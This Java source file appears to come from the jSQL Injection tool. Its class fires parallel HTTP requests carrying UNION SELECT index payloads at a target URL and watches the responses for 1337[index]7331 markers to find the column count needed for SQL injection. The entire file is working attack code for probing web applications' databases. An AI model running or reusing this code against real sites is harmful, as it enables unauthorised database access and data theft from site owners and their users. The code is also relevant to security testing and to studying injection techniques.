package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.exception.PreparationException;
import com.jsql.model.exception.StoppableException;

/**
 * Runnable class, search the correct number of fields in the SQL query.
 * Parallelizes the search, provides the stop capability
 */
public class SuspendableGetIndexesInUrl extends AbstractSuspendable<String> {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(SuspendableGetIndexesInUrl.class);

    @Override
    public String run(Object... args) throws PreparationException, StoppableException {
        // Parallelize the search
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<CallableHTMLPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        boolean isRequestFound = false;
        String initialQuery = "";
        int nbIndex;

        // SQL: each field is built has the following 1337[index]7330+1
        // Search if the source contains 1337[index]7331, this notation allows to exclude
        // pages that display our own url in the source
        for (nbIndex = 1; nbIndex <= 10; nbIndex++) {
            taskCompletionService.submit(
                new CallableHTMLPage(
                    MediatorModel.model().charInsertion + 
                    MediatorModel.model().vendor.getValue().getSqlIndices(nbIndex)
                )
            );
        }

        try {
            // Starting up with 10 requests, loop until 100
            while (!isRequestFound && nbIndex <= 100) {
                // Breaks the loop if the user needs
                /**
                 * TODO pauseOnUserDemand()
                 * stop()
                 */
                if (this.isSuspended()) {
                    throw new StoppableException();
                }

                CallableHTMLPage currentCallable = taskCompletionService.take().get();

                // Found a correct mark 1337[index]7331 in the source
                if (Pattern.compile("(?s).*1337\\d+7331.*").matcher(currentCallable.getContent()).matches()) {
                    MediatorModel.model().srcSuccess = currentCallable.getContent();
                    initialQuery = currentCallable.getUrl().replaceAll("0%2b1", "1");
                    isRequestFound = true;
                // Else add a new index
                } else {
                    taskCompletionService.submit(
                        new CallableHTMLPage(
                            MediatorModel.model().charInsertion + 
                            MediatorModel.model().vendor.getValue().getSqlIndices(nbIndex)
                        )
                    );
                    nbIndex++;
                }
            }
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
        } catch (InterruptedException | ExecutionException e) {
            LOGGER.error(e, e);
        }

        if (isRequestFound) {
            return initialQuery.replaceAll("\\+\\+union\\+select\\+.*?--\\+$", "+");
        }
        return "";
    }
}